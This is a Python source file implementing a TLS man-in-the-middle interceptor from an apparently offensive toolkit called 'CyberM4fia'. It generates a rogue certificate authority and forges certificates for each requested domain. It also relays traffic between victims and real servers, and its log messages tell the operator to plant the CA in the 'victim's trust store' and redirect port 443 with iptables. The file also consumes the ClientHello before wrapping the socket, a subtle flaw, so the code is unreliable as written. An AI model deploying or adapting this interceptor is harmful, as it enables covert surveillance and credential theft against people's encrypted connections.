from __future__ import annotations

import datetime
import os
import socket
import ssl
import threading
import tempfile
from pathlib import Path
from typing import Optional

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from loguru import logger


class SSLInterceptor:

    def __init__(
        self,
        cert_dir: str = "certs",
        listen_host: str = "0.0.0.0",
        listen_port: int = 8443,
        interface: Optional[str] = None,
    ):
        self._cert_dir = Path(cert_dir)
        self._cert_dir.mkdir(parents=True, exist_ok=True)
        self._listen_host = listen_host
        self._listen_port = listen_port
        self._interface = interface
        self._ca_key: Optional[rsa.RSAPrivateKey] = None
        self._ca_cert: Optional[x509.Certificate] = None
        self._ca_key_path = self._cert_dir / "ca.key"
        self._ca_cert_path = self._cert_dir / "ca.crt"
        self._running = False
        self._server_thread: Optional[threading.Thread] = None
        self._cert_cache: dict[str, tuple[str, str]] = {}

    def generate_ca(self) -> tuple[str, str]:
        ca_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )

        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "CyberM4fia Interception CA"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "CyberM4fia"),
        ])

        ca_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
            .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=3650))
            .add_extension(
                x509.BasicConstraints(ca=True, path_length=None),
                critical=True,
            )
            .add_extension(
                x509.KeyUsage(
                    key_cert_sign=True,
                    crl_sign=True,
                    digital_signature=False,
                    content_commitment=False,
                    key_encipherment=False,
                    data_encipherment=False,
                    key_agreement=False,
                    encipher_only=False,
                    decipher_only=False,
                ),
                critical=True,
            )
            .sign(ca_key, hashes.SHA256(), backend=default_backend())
        )

        with open(self._ca_key_path, "wb") as f:
            f.write(ca_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        with open(self._ca_cert_path, "wb") as f:
            f.write(ca_cert.public_bytes(serialization.Encoding.PEM))

        self._ca_key = ca_key
        self._ca_cert = ca_cert

        logger.info(f"CA generated: {self._ca_cert_path}")
        logger.info("install ca.crt in victim's trust store for full interception")

        return str(self._ca_key_path), str(self._ca_cert_path)

    def _generate_domain_cert(self, domain: str) -> tuple[str, str]:
        if domain in self._cert_cache:
            return self._cert_cache[domain]

        if not self._ca_key or not self._ca_cert:
            self.generate_ca()

        domain_key = rsa.generate_private_key(65537, 2048, backend=default_backend())

        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, domain),
        ])

        san = x509.SubjectAlternativeName([x509.DNSName(domain)])
        if domain.startswith("*"):
            san = x509.SubjectAlternativeName([x509.DNSName(domain[2:]), x509.DNSName(domain)])

        domain_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(self._ca_cert.subject)
            .public_key(domain_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
            .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
            .add_extension(san, critical=False)
            .sign(self._ca_key, hashes.SHA256(), backend=default_backend())
        )

        key_path = self._cert_dir / f"{domain}.key"
        cert_path = self._cert_dir / f"{domain}.crt"

        with open(key_path, "wb") as f:
            f.write(domain_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        with open(cert_path, "wb") as f:
            f.write(domain_cert.public_bytes(serialization.Encoding.PEM))

        self._cert_cache[domain] = (str(cert_path), str(key_path))
        logger.debug(f"domain cert generated: {domain}")

        return str(cert_path), str(key_path)

    def _handle_connection(self, client_sock: socket.socket, client_addr: tuple) -> None:
        try:
            client_sock.settimeout(5)
            raw_data = client_sock.recv(4096)

            domain = self._extract_sni(raw_data)
            if not domain:
                client_sock.close()
                return

            cert_path, key_path = self._generate_domain_cert(domain)

            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            tls_sock = context.wrap_socket(client_sock, server_side=True)

            remote_sock = socket.create_connection((domain, 443), timeout=10)
            remote_context = ssl.create_default_context()
            remote_tls = remote_context.wrap_socket(remote_sock, server_hostname=domain)

            t1 = threading.Thread(target=self._relay, args=(tls_sock, remote_tls, f"{client_addr[0]} -> {domain}"))
            t2 = threading.Thread(target=self._relay, args=(remote_tls, tls_sock, f"{domain} -> {client_addr[0]}"))
            t1.daemon = t2.daemon = True
            t1.start()
            t2.start()
            t1.join(timeout=60)
            t2.join(timeout=60)

            logger.debug(f"TLS relay closed: {domain} ({client_addr[0]})")

        except ssl.SSLError as e:
            logger.debug(f"TLS error for {client_addr}: {e}")
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.debug(f"connection error for {client_addr}: {e}")
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    def _relay(self, src: socket.socket, dst: socket.socket, label: str) -> None:
        try:
            while self._running:
                try:
                    data = src.recv(16384)
                except ssl.SSLWantReadError:
                    continue
                except ssl.SSLEOFError:
                    break
                except (ConnectionError, TimeoutError, OSError):
                    break

                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
        finally:
            try:
                src.close()
                dst.close()
            except Exception:
                pass

    def _extract_sni(self, data: bytes) -> Optional[str]:
        try:
            if len(data) < 5 or data[0] != 0x16:
                return None

            rec_len = int.from_bytes(data[3:5], "big")
            if rec_len + 5 > len(data):
                return None

            offset = 5
            if data[offset] != 0x01:
                return None
            handshake_len = int.from_bytes(data[offset + 1:offset + 4], "big")
            offset += 4

            offset += 2
            offset += 32

            session_id_len = data[offset]
            offset += 1 + session_id_len

            cipher_len = int.from_bytes(data[offset:offset + 2], "big")
            offset += 2 + cipher_len

            compression_len = data[offset]
            offset += 1 + compression_len

            ext_len = int.from_bytes(data[offset:offset + 2], "big")
            offset += 2
            end_ext = offset + ext_len

            while offset < end_ext:
                ext_type = int.from_bytes(data[offset:offset + 2], "big")
                ext_data_len = int.from_bytes(data[offset + 2:offset + 4], "big")
                offset += 4

                if ext_type == 0x0000:
                    if ext_data_len < 5:
                        break
                    server_name_list_len = int.from_bytes(data[offset + 2:offset + 4], "big")
                    pos = offset + 4
                    end_names = pos + server_name_list_len
                    while pos < end_names:
                        if data[pos] != 0x00:
                            break
                        name_len = int.from_bytes(data[pos + 1:pos + 3], "big")
                        pos += 3
                        domain = data[pos:pos + name_len].decode("ascii", errors="replace")
                        return domain
                    break
                offset += ext_data_len

            return None
        except Exception:
            return None

    def _accept_loop(self) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(1)

        try:
            server.bind((self._listen_host, self._listen_port))
            server.listen(10)
            logger.info(f"TLS interceptor listening on {self._listen_host}:{self._listen_port}")
            logger.info("redirect port 443 traffic with iptables: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443")
        except OSError as e:
            logger.error(f"cannot bind to port {self._listen_port}: {e}")
            return

        while self._running:
            try:
                client_sock, client_addr = server.accept()
                t = threading.Thread(target=self._handle_connection, args=(client_sock, client_addr))
                t.daemon = True
                t.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.debug(f"accept error: {e}")

        try:
            server.close()
        except Exception:
            pass

    def start(self) -> None:
        self._running = True
        if not self._ca_cert:
            self.generate_ca()
        self._server_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._server_thread.start()

    def stop(self) -> None:
        self._running = False
        logger.info("TLS interceptor stopped")
